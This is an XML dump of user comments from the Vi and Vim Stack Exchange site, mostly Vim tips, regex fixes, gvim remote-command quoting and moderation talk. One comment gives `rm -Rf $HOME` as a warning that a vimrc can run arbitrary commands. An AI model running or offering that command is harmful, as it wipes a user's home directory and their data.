  <row Id="1464" PostId="2047" Score="0" Text="@romainl But it's *not* as easy as that. To make a *good* comparison you need to use every plugin for at least weeks. There's a good chance that someone already did that, and is able to write a good, high-quality, and useful answer outlining the key differences. And even **if** this is something that is mentioned in the documentation, then that's **not** necessarily the same as &quot;explaining something&quot;. Applying documentation to a problem is a problem on it's own." CreationDate="2015-02-20T16:33:53.687" UserId="51" />
  <row Id="1466" PostId="2053" Score="0" Text="@Rmano Hmm, using `BufReadPost` works for me (tested it, in Nautilus); perhaps there is another autocmd in that's interfering? You can try starting Vim with blank vimrc file except for this one line. You can also replace the `lchdir` with `echoerr(expand(&quot;%:p:h&quot;))` to show an &quot;error&quot; with the file path (this is useful for debugging)." CreationDate="2015-02-20T16:36:21.283" UserId="51" />
  <row Id="1468" PostId="2053" Score="0" Text="Ok. Found it. If I call `gvim /home/romano/path/file.tex` it works, but if I call (as is doing my default action) `exec gvim --servername desktop_0 --remote-tab-silent /home/romano/path/file.tex` it does not work (`desktop_0` is automatically generated for the current desktop). Now I am really puzzled." CreationDate="2015-02-20T16:45:25.963" UserId="854" />
  <row Id="1469" PostId="2025" Score="1" Text="This question appears to be about a proprietary vi emulator embedded in another program. Current consensus is that it is not [considered to be vi](http://meta.vi.stackexchange.com/q/7/24) and thus off-topic, but you may want to post a Meta question to discuss that." CreationDate="2015-02-20T17:06:49.247" UserId="24" />
  <row Id="1470" PostId="2048" Score="2" Text="While this link may answer the question, it is better to include the essential parts of the answer here and provide the link for reference.  Link-only answers can become invalid if the linked page changes." CreationDate="2015-02-20T17:08:30.417" UserId="51" />
  <row Id="1471" PostId="2053" Score="0" Text="@Rmano Hm, it seems autocmd works different when using `--remote`? Not sure ... Need to test more ..." CreationDate="2015-02-20T17:10:21.603" UserId="51" />
  <row Id="1474" PostId="2028" Score="0" Text="@muru Link added. Sorry about that." CreationDate="2015-02-20T17:20:02.463" UserId="813" />
  <row Id="1475" PostId="2048" Score="1" Text="?? Links are to the plugins official pages. Yes they can change if the plugins disappear or if they are moved elsewhere. In that case, I'll update the message in the first case as I did before on SO. And in the second case, it would mean that part of any message that details what the plugin does would become deprecated. Worse case scenario: detailing what the plugin really do will become obsolete while their respective author work on them, add features, and so on. Any way. I'll add a brief description of them next week..." CreationDate="2015-02-20T17:24:13.740" UserId="626" />
  <row Id="1478" PostId="2057" Score="0" Text="The whole point of this question is that you don't know how many lines you want to remove." CreationDate="2015-02-20T17:30:30.687" UserId="24" />
  <row Id="1480" PostId="2063" Score="0" Text="possible duplicate of [How can I copy text to the system clipboard from Vim?](http://vi.stackexchange.com/questions/84/how-can-i-copy-text-to-the-system-clipboard-from-vim)" CreationDate="2015-02-20T17:37:07.750" UserId="31" />
  <row Id="1481" PostId="2063" Score="0" Text="@Carpetsmoker in that case, VtC'ing as &quot;duplicate&quot;. That'll give us the &quot;This question already has an answer here (link to your question)&quot; message, which is now fully accurate." CreationDate="2015-02-20T17:38:35.463" UserId="31" />
  <row Id="1484" PostId="2063" Score="0" Text="@yo' I don't think closed as duplicate get auto-deleted.  They shouldn't! Just in case, upvoted so it'll have a positive score." CreationDate="2015-02-20T17:40:09.893" UserId="31" />
  <row Id="1487" PostId="2063" Score="0" Text="@yo' BTW: http://meta.stackexchange.com/a/177675/27727 confirms that closed as duplicate don't get auto-deleted. Not sure if there is really much more detailed information to provide (e.g., how to actually install a package using yum/rpm/etc. is probably better asked on [unix.se].)" CreationDate="2015-02-20T17:43:37.317" UserId="31" />
  <row Id="1491" PostId="2063" Score="0" Text="(Tried to move to chat, but that just popped up an error. Oh well). @yo' I guess if there is really more to say other than &quot;you need to install `vim-x11` and run `vimx`&quot; ... go ahead and answer it here and I'll retract my close vote." CreationDate="2015-02-20T17:47:43.660" UserId="31" />
  <row Id="1492" PostId="2053" Score="0" Text="Ok, marking this as answered --- and posting another question. Thanks!" CreationDate="2015-02-20T18:00:55.760" UserId="854" />
  <row Id="1493" PostId="2057" Score="0" Text="200_success, you don't have to know how many lines you want to remove with the answer i posted. All you have to know is &quot;to which line do you want to remove&quot;" CreationDate="2015-02-20T18:15:33.457" UserId="861" />
  <row Id="1494" PostId="2048" Score="2" Text="@LucHermitte The post came up in the review queue; I didn't add the exact text of this message myself, the system did that for me. In any case, link only answers are considered &quot;bad&quot; on SO and most, if not all, SE sites. Not just because they may go out of date, but also because they don't really *explain* things; almost any question could be &quot;answered&quot; by linking to the right documentation page(s), hell, you could even link to the source code, but does that *really* explain something? Is that *really* useful? Does that *really* contribute to someone's understanding of Vim?" CreationDate="2015-02-20T19:25:04.080" UserId="51" />
  <row Id="1495" PostId="2048" Score="0" Text="I'm also a bit surprised that someone with 15k reputation and 371 answers on SO doesn't know this... I think that link-only answers are the top reason for removing posts on SO (it's certainly the one I see the most often in the review queue). Not saying we should necessarily do the same things as SO, and I would encourage you to go over to our meta site and discuss this further, if you really disagree with it." CreationDate="2015-02-20T19:27:16.190" UserId="51" />
  <row Id="1496" PostId="2048" Score="0" Text="*&quot;part of any message that details what the plugin does would become deprecated. Worse case scenario: detailing what the plugin really do will become obsolete while their respective author work on them, add features, and so on&quot;* -&gt; This is true. But it's true for *any* answer you give :-)" CreationDate="2015-02-20T19:30:20.957" UserId="51" />
  <row Id="1497" PostId="2066" Score="1" Text="[Four years old and no responses...](https://groups.google.com/forum/#!topic/vim_dev/8DZdu57h-3k)" CreationDate="2015-02-20T20:41:21.230" UserId="205" />
  <row Id="1498" PostId="2025" Score="0" Text="@200_success Thanks for the feedback.  I did check [help/on-topic] before asking and interpreted &quot;specific issues with the Vi and Vim family of editors&quot; to include this type of plugin.  Incidentally, [tag:viemu] is not _solely_ a programmer's plugin in that there is a version for Microsoft Office." CreationDate="2015-02-20T20:48:16.670" UserId="811" />
  <row Id="1499" PostId="2025" Score="2" Text="This being a brand-new site, the help center is still very sketchy because the rules are not set in stone yet. You can play a role in shaping the direction of the site by posting on [meta]." CreationDate="2015-02-20T20:54:31.130" UserId="24" />
  <row Id="1500" PostId="2066" Score="0" Text="So seems a bug... where is the main bug report site for vim? Searched here http://www.vim.org/ but just found mailing lists..." CreationDate="2015-02-20T21:17:50.027" UserId="854" />
  <row Id="1501" PostId="2066" Score="0" Text="Looking around in that mailing list, I think it's on Google Code: https://code.google.com/p/vim/issues/list" CreationDate="2015-02-20T21:18:59.153" UserId="205" />
  <row Id="1506" PostId="2066" Score="0" Text="I'm not sure if it's a bug, or expected behaviour (but it could very well be one!) I need to carefuly read the remote server &amp; autocmd pages to be sure... You can use `:help bug-reports` for information on how to report them." CreationDate="2015-02-20T22:19:59.860" UserId="51" />
  <row Id="1507" PostId="1882" Score="0" Text="@JohnO'M. could you add a reference on how `abbreviate` might be better suited for this job?" CreationDate="2015-02-20T22:34:11.367" UserId="356" />
  <row Id="1508" PostId="26" Score="2" Text="Shortcut: `:so $MYVIMRC`." CreationDate="2015-02-20T22:43:58.823" UserId="467" />
  <row Id="1509" PostId="2026" Score="1" Text="You can also use g, (comma) to go to a newer editing position." CreationDate="2015-02-20T23:12:17.183" UserId="462" />
  <row Id="1512" PostId="2048" Score="1" Text="_&quot;I didn't add the exact text of this message myself, the system did that for me&quot;_. OK. That explains the message, which I found quite odd. Regarding links. I understand SO/SE policy about RTFM/SFTW. Unlike other forums, recurring/duplicate questions are closed when detected, and SO/SE tends more toward a wiki approach." CreationDate="2015-02-20T23:54:37.657" UserId="626" />
  <row Id="1513" PostId="2041" Score="1" Text="Crazy approach: using [textobj-word-column.vim](https://github.com/coderifous/textobj-word-column.vim) you can do `ciC*&lt;esc&gt;` and be done. Note: this plugin is a &quot;do what I mean&quot; plugin so it fails in unexpected places and ways, but the plugin is still useful in some easy cases like this." CreationDate="2015-02-20T23:55:12.370" UserId="778" />
  <row Id="1514" PostId="2071" Score="0" Text="I think this is what you want? [How can I rename the file I'm editing?](https://vi.stackexchange.com/questions/305/how-can-i-rename-the-file-im-editing?s=1|0.8744). It doesn't do anything about the working directory, but you can fix that with `:cd %:p:h`." CreationDate="2015-02-20T23:57:55.623" UserId="51" />
  <row Id="1515" PostId="2048" Score="0" Text="Regarding where to find plugins. I could duplicate their documentation. But it won't help much. Moreover, it's almost impossible to keep the answer up to date as the plugins evolve. Adding a not-up-to-date short summary of the features is possible, and I'll see to it. In any case, their official page is the entry point. Regarding plugins, this is the first important information. Indeed, a nice presentation could appeals to us... Until we find out the plugin cannot work in our particular case -- which happens often with FSOSS. This is where a list of available solutions is also interesting." CreationDate="2015-02-21T00:00:04.313" UserId="626" />
  <row Id="1516" PostId="2071" Score="0" Text="You can define a function yourself that does this, called e.g. `:we` -- is that what you're looking for?" CreationDate="2015-02-21T00:06:48.823" UserId="82" />
  <row Id="1517" PostId="2072" Score="0" Text="Beat me by twelve seconds!" CreationDate="2015-02-21T00:22:44.303" UserId="142" />
  <row Id="1518" PostId="2010" Score="0" Text="What terminal are you using? I have [this script](https://gist.github.com/WChargin/d2ab9805b0f2d5e51845) for `gnome-terminal`." CreationDate="2015-02-21T00:24:20.873" UserId="142" />
  <row Id="1520" PostId="441" Score="0" Text="For settings, `:help 'display'` is the same as `:help display?`." CreationDate="2015-02-21T00:26:20.363" UserId="142" />
  <row Id="1521" PostId="2072" Score="0" Text="Indeed, saveas is what I was looking for. I don't suppose there's an option to have it open in a new window, is there?" CreationDate="2015-02-21T00:31:26.013" UserId="9" />
  <row Id="1522" PostId="2072" Score="0" Text="@Kevin By &quot;window,&quot; do you mean split or tab?" CreationDate="2015-02-21T00:32:37.503" UserId="88" />
  <row Id="1523" PostId="2072" Score="0" Text="Split, preferably vertical (or an option for both)" CreationDate="2015-02-21T00:33:25.700" UserId="9" />
  <row Id="1524" PostId="2072" Score="0" Text="@Kevin Not that I'm aware of, but you could always use, for example, `&lt;C-w&gt;&lt;C-s&gt;:saveas bar&lt;cr&gt;`. (This could be all in one ex command if you want to make a mapping or something: `:wincmd s|saveas bar`.)" CreationDate="2015-02-21T00:36:13.790" UserId="88" />
  <row Id="1525" PostId="2074" Score="0" Text="Definitely helps avoiding typing out the name twice, but does reopen like `:e`." CreationDate="2015-02-21T00:45:55.573" UserId="9" />
  <row Id="1527" PostId="2072" Score="0" Text="@Kevin `:vs` (with no argument) will split the window, having the same file in both buffers. You can then choose one of the buffers and use `:saveas bar.txt`, it will leave the 2nd buffer intact." CreationDate="2015-02-21T01:00:24.553" UserId="82" />
  <row Id="1528" PostId="103" Score="0" Text="`:help 'display'` is more accurate." CreationDate="2015-02-21T01:13:14.450" UserId="902" />
  <row Id="1529" PostId="2075" Score="0" Text="Does this answer your question, or am I missing something?" CreationDate="2015-02-21T03:42:26.753" UserId="142" />
  <row Id="1530" PostId="26" Score="0" Text="@kenorb: I've added this possibility; thanks for mentioning it!" CreationDate="2015-02-21T04:34:38.317" UserId="16" />
  <row Id="1531" PostId="2021" Score="0" Text="Expanding on @PeterRincker's quicker-and-dirtier regex, how about something like (in PCRE, because I'm unfamiliar with Vim's flavor of regex) `/[a-z]+:\/\/\S+/`?" CreationDate="2015-02-21T04:35:44.073" UserId="67" />
  <row Id="1532" PostId="2025" Score="0" Text="nvi (at least version 1.81.6) also doesn't let you `:let` a register for later playback. It doesn't have a let command at all, as near as I can tell. If you broaden the question to saving registers in vi family editors that lack the ability to let a register, you might get an answer that works on viemu as well." CreationDate="2015-02-21T05:38:54.570" UserId="227" />
  <row Id="1533" PostId="2034" Score="0" Text="You could also have used `\&gt;` to match the end of a word in place of the `\+`. (Only mentioning it because it's what popped into my head first, and it looks as though the OP might not know about `\&gt;`.)" CreationDate="2015-02-21T08:42:13.847" UserId="343" />
  <row Id="1534" PostId="2034" Score="0" Text="@Rich Actually yes, that would be better combined with `\+`. `/\&lt;\d\+\&gt;/` should keep digits in the middle of words safe." CreationDate="2015-02-21T08:43:53.637" UserId="205" />
  <row Id="1535" PostId="2034" Score="0" Text="@muru I'm not following you. `/\d\&gt;/` will already only match the digits at the ends of words." CreationDate="2015-02-21T08:45:56.313" UserId="343" />
  <row Id="1536" PostId="2034" Score="0" Text="@Rich yes, and `\&lt;\d` would take care of `abc12`." CreationDate="2015-02-21T08:48:25.057" UserId="205" />
  <row Id="1537" PostId="2034" Score="0" Text="@muru Ah, I see what you mean." CreationDate="2015-02-21T08:48:45.823" UserId="343" />
  <row Id="1538" PostId="2042" Score="0" Text="This answer has the advantage that it works with vi as well, in case you have no vim on Aix/HPUX/Solaris/other Unix variants." CreationDate="2015-02-21T08:50:48.987" UserId="908" />
  <row Id="1539" PostId="2036" Score="0" Text="that could be the main reason for confusion! thanks!" CreationDate="2015-02-21T09:38:15.473" UserId="833" />
  <row Id="1540" PostId="2041" Score="0" Text="interesting the normal and dot formula!" CreationDate="2015-02-21T09:40:46.143" UserId="833" />
  <row Id="1541" PostId="2082" Score="1" Text="Seems highly shell dependent. `gvim --remote-send ':tabe foo\ bar.txt&lt;CR&gt;'` worked for me on bash and zsh. And the quotes seem to matter too. If I use `&quot;` internally, it didn't work, but `'` did: `gvim --remote-send &quot;:tabe 'foo bar.txt'&lt;CR&gt;&quot;`" CreationDate="2015-02-21T11:12:57.167" UserId="205" />
  <row Id="1542" PostId="2082" Score="0" Text="Hmmm... `gvim --remote-send &quot;:tabe 'f s.txt'&lt;CR&gt;&quot;` didn't work for me, nor writing `:tabe 'f s.txt'` in vim, I got `E77: Too many files names`." CreationDate="2015-02-21T12:00:55.990" UserId="854" />
  <row Id="1543" PostId="2082" Score="0" Text="I jumped the gun a bit. For me, a tab opens alright, but the filename is `'foo bar.txt'`, with the quotes. But a single backslash still works, as does `foo=&quot;f\ s.txt&quot; gvim --remote-send &quot;:tabe $foo&lt;CR&gt;&quot;`." CreationDate="2015-02-21T12:07:09.527" UserId="205" />
  <row Id="1544" PostId="2080" Score="0" Text="`/\/s\d{2,4}/`is not working for me, but `/\/s\d\{2,4}/` works fine! Thanks for help." CreationDate="2015-02-21T12:14:43.223" UserId="911" />
  <row Id="1545" PostId="2082" Score="0" Text="@muru yep I have `fileq=&quot;$(echo &quot;$file&quot; |  awk '{gsub(/ /,&quot;\\\ &quot;)}1')&quot;` and `gvim --servername $desktop --remote-send &quot;&lt;ESC&gt;:tabe $fileq &lt;CR&gt;&lt;CR&gt;&quot;&#xA;` which works, but just for spaces..." CreationDate="2015-02-21T12:20:18.700" UserId="854" />
  <row Id="1546" PostId="2082" Score="1" Text="Wouldn't `gvim --servername $desktop --remote-send &quot;&lt;ESC&gt;:tabe ${file// /\\ }&lt;CR&gt;&quot;` be simpler?" CreationDate="2015-02-21T12:25:07.037" UserId="205" />
  <row Id="1547" PostId="2082" Score="0" Text="@muru probably yes. Although working just for spaces again..." CreationDate="2015-02-21T12:27:03.340" UserId="854" />
  <row Id="1548" PostId="2082" Score="0" Text="I have one twisted idea: Keep a fixed file open in GVim, write your filename to that file, have Vim autoreload its contents and open any new lines in new tabs." CreationDate="2015-02-21T13:00:31.883" UserId="205" />
  <row Id="1550" PostId="2082" Score="0" Text="Have you tried replacing spaces with `&lt;Space&gt;`? Since `&lt;Esc&gt;` and `&lt;Cr&gt;` is captured by Vim and interpreted correctly maybe `&lt;Space&gt;` would too" CreationDate="2015-02-21T13:27:04.303" UserId="544" />
  <row Id="1551" PostId="2082" Score="0" Text="@Sukima -- the problem is that I would like a way to quote *the whole string* without having to substitute anything. The solution for spaces works, but it's not generic (what about `&quot;`, or other special chars?)" CreationDate="2015-02-21T13:34:41.320" UserId="854" />
  <row Id="1552" PostId="2068" Score="0" Text="I looked at the source code yesterday, and I don't think this is possible, but I'm not 100% sure." CreationDate="2015-02-21T13:48:09.023" UserId="51" />
  <row Id="1553" PostId="2083" Score="2" Text="Are you doing the git checkouts and pulls from within Vim? This sounds like something to solve in git, independently of vim." CreationDate="2015-02-21T14:19:05.770" UserId="8" />
  <row Id="1555" PostId="2080" Score="0" Text="You're right! I've updated my answer." CreationDate="2015-02-21T16:46:59.950" UserId="343" />
  <row Id="1556" PostId="2068" Score="1" Text="It would work with `Mon...`, but think about `Py...` or `Monty Py...`. How would Vim know how many words go backwards to find the beginning of the pattern to look for? I'm not sure, but this might be the reason why it's done this way." CreationDate="2015-02-21T17:11:26.787" UserId="860" />
  <row Id="1557" PostId="232" Score="0" Text="To be fair, Dvorak uses the keys dhtn, not htns, in the place where Qwerty uses hjkl." CreationDate="2015-02-21T17:26:32.367" UserId="810" />
  <row Id="1558" PostId="2082" Score="0" Text="Would the `shellescape` function be helpful?" CreationDate="2015-02-21T19:13:08.263" UserId="865" />
  <row Id="1559" PostId="2075" Score="0" Text="Determining whether or not the character on the cursor is matched isn't exactly the key. The key is to determine whether or not a given form is balanced. If the form is balanced and we find ourselves in this position: `(|)`, pressing `&lt;BS&gt;` should delete both. However, if the top level form is unbalanced, like this: `(defn (|)`, pressing `&lt;BS&gt;` should only delete what would normally be deleted - in this case leaving us with `(defn |)`." CreationDate="2015-02-21T19:26:52.980" UserId="489" />
  <row Id="1560" PostId="2015" Score="1" Text="@hippietrail linux, no gui." CreationDate="2015-02-21T20:07:50.603" UserId="784" />
  <row Id="1561" PostId="2068" Score="0" Text="@xaizek, I see your point. But at least for completing several words (`Monty Python`) when you have just typed part of the first (e.g. `Mon`) there would be no problem." CreationDate="2015-02-21T20:28:45.667" UserId="356" />
  <row Id="1562" PostId="2018" Score="0" Text="@name Please define *system clipboard*" CreationDate="2015-02-21T22:44:59.153" UserId="179" />
  <row Id="1563" PostId="2018" Score="0" Text="@muru this is only assumption that screen is remote. Many folks are using screen/tmux - locally" CreationDate="2015-02-21T22:46:13.007" UserId="179" />
  <row Id="1564" PostId="2018" Score="0" Text="@AB  I work remotely ssh + screens + vims. I am fine with using remote's host system clipboard and not the client's one." CreationDate="2015-02-21T22:59:02.863" UserId="784" />
  <row Id="1565" PostId="2018" Score="0" Text="@AB &quot;if you're on SSH&quot;" CreationDate="2015-02-21T23:28:32.390" UserId="205" />
  <row Id="1566" PostId="2067" Score="2" Text="You essentially repeat the answer by @200_success." CreationDate="2015-02-22T00:55:25.853" UserId="938" />
  <row Id="1567" PostId="1961" Score="0" Text="With my Debian, the default window is 200x50, setting both lines and columns to 999 in any of `vim` itself, rc file or with `gvim -c 'set them'` gives me 236x61 and maximising gives 237x61, so even closer than under Windows. Interestingly, `gvim -geometry 999x999` gives me a maximised window at the slightly larger size so that may be better for non-Windows though I suspect it'll be harder to ensure all invocation methods use that. Pity there's not a simalt type thing for nonWin platforms." CreationDate="2015-02-22T02:20:57.377" UserId="579" />
  <row Id="1568" PostId="1961" Score="0" Text="Still, it's worth some rep since it comes close enough, and is more portable than the win-only method. By the way, using 9999x9999 as geometry freaks out `vim` since it doesn't like windows with dimensions over 64K pixels (geometry is character cells in this case rather than pixels). 999x999 seems to work okay. Not sure how this would go in a multi-monitor systems." CreationDate="2015-02-22T02:22:15.537" UserId="579" />
  <row Id="1570" PostId="2089" Score="0" Text="The next part is a bit meta: Which form should we use while answering on this site? - should I ask this on Meta, or add it to the question?" CreationDate="2015-02-22T02:50:13.657" UserId="205" />
  <row Id="1571" PostId="2084" Score="0" Text="Tim Pope [wrote a blog article](http://tbaggery.com/2011/08/08/effortless-ctags-with-git.html) a few years back that details how something like this can be done." CreationDate="2015-02-22T02:55:39.217" UserId="64" />
  <row Id="1572" PostId="2082" Score="1" Text="Keep in mind that `:edit` (and its variants) doesn't accept a quoted filename. All special characters need to be individually escaped. So, `:edit &quot;foo bar.txt&quot;` won't work; you need `:edit foo\ bar.txt`. That said, something like `:execute 'tabedit' escape('$file', ' ')` might be on the right track." CreationDate="2015-02-22T03:13:08.390" UserId="64" />
  <row Id="1573" PostId="1971" Score="0" Text="This difference has to do with [altscreen](http://stackoverflow.com/a/2181115/959486) (in `screen`) or [alternate-screen](http://stackoverflow.com/a/4293038/959486) (in `tmux`)." CreationDate="2015-02-22T03:31:56.137" UserId="64" />
  <row Id="1574" PostId="2089" Score="0" Text="I would say it depends. I would always use noremap version if demonstrating a mapping. This way, people get in the habit of using the non-recursive mappings over the recursive versions. Unless of course, there is a reason to use map specifically, for instance, in a &lt;Plug&gt; mapping." CreationDate="2015-02-22T03:53:17.650" UserId="246" />
  <row Id="1575" PostId="2083" Score="0" Text="@Gilles I am not - all git changes are happening on my own in bash CLI.  But, if any thinks this makes it off-topic, the integration is specific to Vim, and I wasn't positive if the issue was caused by another matter that others have seen commonly" CreationDate="2015-02-22T04:02:14.783" UserId="915" />
  <row Id="1576" PostId="2084" Score="0" Text="I don't check in the tags file, and I don't have an immediate sense of need to do this.  I'd actually never thought of it, and for ludicrously-large projects I can see the benefit.  Thanks for the edge case tip!  Do you know about those git hooks?  Pardon; I'm sure I can find this out one my own, in time." CreationDate="2015-02-22T04:03:42.903" UserId="915" />
  <row Id="1577" PostId="1882" Score="0" Text="@GonçaloRibeiro done. I hope it helps." CreationDate="2015-02-22T04:41:52.150" UserId="227" />
  <row Id="1578" PostId="2093" Score="2" Text="Welcome to Vi and Vim Stack Exchange! I'm voting to close this as Too Broad, because as it currently stands, there's no way to provide a definitive answer. We have no idea what kind of text you're working with, and &quot;how do I fold... stuff&quot; isn't specific enough of a question. (Of course your text has paragraphs and whatnot, but there's not a clear enough description to get an idea about what you're talking about.) Perhaps you could edit in an example of what kind of plain text you would be editing." CreationDate="2015-02-22T05:22:24.540" UserId="88" />
  <row Id="1579" PostId="2094" Score="2" Text="You are aware that a vimrc can do anything? e.g., it can execute arbitrary commands such as `rm -Rf $HOME`. You do *not* want to source an untrusted vimrc." CreationDate="2015-02-22T06:03:10.777" UserId="31" />
  <row Id="1580" PostId="2094" Score="1" Text="http://www.vim.org/scripts/script.php?script_id=441" CreationDate="2015-02-22T06:17:06.900" UserId="205" />
  <row Id="1581" PostId="2094" Score="2" Text="@derobert I am not very concerned with that; if someone breaks in and drops a random .vimrc, well he did already breakin end of the day; if it is stuff coming from a src control repo, and i pull or rebase without noticing, then it would be _me_ to blame, like downloading a random piece of software, make and execute." CreationDate="2015-02-22T07:06:41.453" UserId="188" />
  <row Id="1582" PostId="2093" Score="0" Text="@Doorknob I described two ways of how it can be solved, does that make it more understandable? The entire point of it is to have tools that can be used on &quot;stuff&quot; - as long as it has partial structure." CreationDate="2015-02-22T07:55:30.913" UserId="925" />
  <row Id="1583" PostId="1951" Score="0" Text="Thanks @WChargin, corrected." CreationDate="2015-02-22T08:24:18.300" UserId="630" />
  <row Id="1584" PostId="2068" Score="0" Text="I'm not sure if &quot;at least for&quot; is good enough for Bram.  I read some discussions on features that are missing from Vim and they stopped after stating that implementation has limitations similar to this one." CreationDate="2015-02-22T08:53:07.857" UserId="860" />
  <row Id="1585" PostId="1882" Score="0" Text="@JohnO'M. thank you. I will accept your answer now." CreationDate="2015-02-22T09:37:46.633" UserId="356" />
  <row Id="1586" PostId="1915" Score="2" Text="How do you know where the end is? If you can describe the end you can delete to that point. If you can describe how you can `move` to the end. Then deleting to the end is no different than moving to the end." CreationDate="2015-02-22T09:40:50.030" UserId="383" />
  <row Id="1587" PostId="2076" Score="0" Text="The answers to all of your questions can be found in Vim's documentation: `:help :set`, `:help :let`, `:help g:`. Don't ask others to do your work for you, don't ask others to think for you." CreationDate="2015-02-22T10:12:57.447" UserId="54" />
  <row Id="1588" PostId="2094" Score="2" Text="Related: [Vim: apply settings on files in directory](http://stackoverflow.com/questions/456792/vim-apply-settings-on-files-in-directory) at stackoverflow SE" CreationDate="2015-02-22T13:08:46.330" UserId="467" />
  <row Id="1589" PostId="1915" Score="0" Text="@Loki, moving to the end is usually just using page-down and the arrow keys until I reach there. It _may_ be the first or tenth blank line, it _may_ be the first closing brace. Bottom line is, it varies quite a bit." CreationDate="2015-02-22T13:31:54.417" UserId="579" />
  <row Id="1593" PostId="2093" Score="0" Text="*no clear rules.* -&gt; Well, it's the nature of the computer to work by rules. You can create folds in `$any` file format. I [do so in one of my scripts](http://code.arp242.net/password-bunny/src/d5bbc3a296e4b54b53ff83745cf29b873814c7b5/pwbunny.vim?at=default#cl-147); there are also some folding functions (`:help folding-functions`); you can combine this to create a *complex* set of rules to be &quot;smart&quot; about what Vim should fold, I'm not sure if this will actually work very well (but it could perhaps do), but such thing is certainly not trival to do, and IMHO beyond the scope of an answer here.." CreationDate="2015-02-22T16:46:55.167" UserId="51" />
  <row Id="1594" PostId="2093" Score="0" Text="@Carpetsmoker Oh, I would not expect the answer to implement a solution! More like pointing to existing tools or methods. I'd say your comment is almost an answer." CreationDate="2015-02-22T17:07:28.657" UserId="925" />
  <row Id="1595" PostId="2100" Score="0" Text="It seems this plugin is written by [tommcdo](http://vi.stackexchange.com/users/64/tommcdo) :-) ... It's not clear to me how to use the vim-repeat plugin by the way; is this a separate way to do this? Or something that's to be used in combination with vim-exchange?" CreationDate="2015-02-22T17:21:08.317" UserId="51" />
  <row Id="1597" PostId="2100" Score="0" Text="Exchange.vim doesn't actually require repeat.vim :)" CreationDate="2015-02-22T17:27:41.213" UserId="64" />
  <row Id="1598" PostId="2099" Score="0" Text="Yeah, the visual mode in my answer is entirely superfluous; you don't *need* it as such (I briefly mentioned this in my answer, but I didn't want to make it *too* long), but I am personally not smart enough to use vi/Vim motions flawlessly :-) IMHO visual mode makes things a lot easier, and because I make less mistakes, also makes it more efficient :-)" CreationDate="2015-02-22T17:30:11.673" UserId="51" />
  <row Id="1599" PostId="2100" Score="0" Text="vim-repeat is a plugin to repeat certain commands with the dot `.`. Other plugins can use vim-repeat to repeat their own functionality with `.`." CreationDate="2015-02-22T17:59:02.260" UserId="962" />
  <row Id="1600" PostId="1874" Score="0" Text="Though not an answer, if you find yourself hunting for code examples to make your own solution, I recommend checking the fabulous [Microviche](https://github.com/q335r49/microviche) project." CreationDate="2015-02-22T18:17:00.387" UserId="915" />
  <row Id="1601" PostId="2099" Score="0" Text="I agree the visual mode is very useful and that it often makes things easier and clearer. Btw: I just noticed that my answer was covered by your first bonus tip. But I think it should be the first thing to mention, and deserves more than the bonus tip spot. :)" CreationDate="2015-02-22T18:18:11.960" UserId="21" />
  <row Id="1602" PostId="2105" Score="0" Text="Any suggestions for better tags on this question?" CreationDate="2015-02-22T19:49:37.813" UserId="24" />
  <row Id="1603" PostId="2045" Score="0" Text="Your &quot;answer&quot; appears to just restate the premise of the question. So the answer is &quot;no&quot;?" CreationDate="2015-02-22T19:51:08.083" UserId="24" />
  <row Id="1604" PostId="2105" Score="1" Text="maybe a new 'pure-vi' or similar tag? I've seen several questions that would benefit from a tag that would indicate a desire to have no external tools involved. Should I ask about that on Meta?" CreationDate="2015-02-22T20:19:43.977" UserId="227" />
  <row Id="1605" PostId="2106" Score="3" Text="Instead of the `:normal` command, we can use the Ex command `:move 0`, which moves the line to the beginning of the buffer." CreationDate="2015-02-22T20:21:30.980" UserId="64" />
  <row Id="1606" PostId="2106" Score="1" Text="Also `:execute` is only necessary when the command needs to be built dynamically, e.g. `:execute 'normal' g:user_command`." CreationDate="2015-02-22T20:23:56.103" UserId="64" />
  <row Id="1607" PostId="2106" Score="0" Text="@tommcdo good points! I'm in the habit of using `:execute` because I often end up appending other Ex commands after the existing one later, and it's more convenient for me to have the `:exe` there already than to have to go back and insert it later. Unfortunately, that habit leaked into this answer where it doesn't apply as much." CreationDate="2015-02-22T20:34:32.393" UserId="227" />
  <row Id="1610" PostId="2106" Score="1" Text="More explanation about my use of `:execute`: since it takes a string, it provides a clear delineation for where the normal-mode commands end, even though I'm not constructing the string, it's easier for me to find balanced quotation marks than to look for `&lt;esc&gt;` or whatever to terminate the mode. Again, this is personal preference and habit. :-)" CreationDate="2015-02-22T20:41:36.133" UserId="227" />
  <row Id="1611" PostId="2045" Score="0" Text="@200_success It's &quot;yes&quot; for `nvi` (with the `.`), but indeed &quot;no, this is not possible&quot; for the original `vi`... So only that part confirms (or &quot;restates&quot;, if you will) the premise of the question." CreationDate="2015-02-22T20:46:33.463" UserId="51" />
  <row Id="1612" PostId="2106" Score="0" Text="Note this only works on the entire buffer ... Something like `:7,8g/^/move 0` does strange things..." CreationDate="2015-02-22T20:56:30.890" UserId="51" />
  <row Id="1614" PostId="2106" Score="0" Text="Very true. I'll make note of that in the answer. I didn't make it a subset because 200_success explicitly called out first and last lines." CreationDate="2015-02-22T20:58:48.267" UserId="227" />
  <row Id="1615" PostId="2107" Score="1" Text="As a FYI for readers, the `&lt;line1&gt;` &amp; `&lt;line2&gt;` are required to make this work on a range, ie: `:7,9Reverse` (they're features of `command`, not `global` or `move`). The simpler `:command! -bar -range=% Reverse :global/^/m 0` will also work, but only for the entire buffer..." CreationDate="2015-02-22T21:02:30.783" UserId="51" />
  <row Id="1616" PostId="2106" Score="1" Text="This will work for a range btw: `:9,11g/^/move 8` ... The last number needs to be the start of the range minus 1 (adapted from Ingo's answer)." CreationDate="2015-02-22T21:05:33.687" UserId="51" />
  <row Id="1617" PostId="2105" Score="1" Text="@Carpetsmoker (and anyone else interested in following this) the tag question is now on meta http://meta.vi.stackexchange.com/questions/1229/should-we-have-a-tag-to-indicate-a-question-doesnt-want-external-tools-involed" CreationDate="2015-02-22T21:36:02.777" UserId="227" />
  <row Id="1618" PostId="2084" Score="0" Text="@New Alexandria: if you want to learn more about git hooks, I suggest to check out your .git/hooks folder. By default there should be some example scripts in there to inspire you. For details check out the official documentation at: http://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks" CreationDate="2015-02-22T21:38:33.497" UserId="875" />
  <row Id="1619" PostId="2094" Score="0" Text="@Carpetsmoker thanks, definitely a duplicate; should i delete or wait for close votes?" CreationDate="2015-02-22T21:44:32.130" UserId="188" />
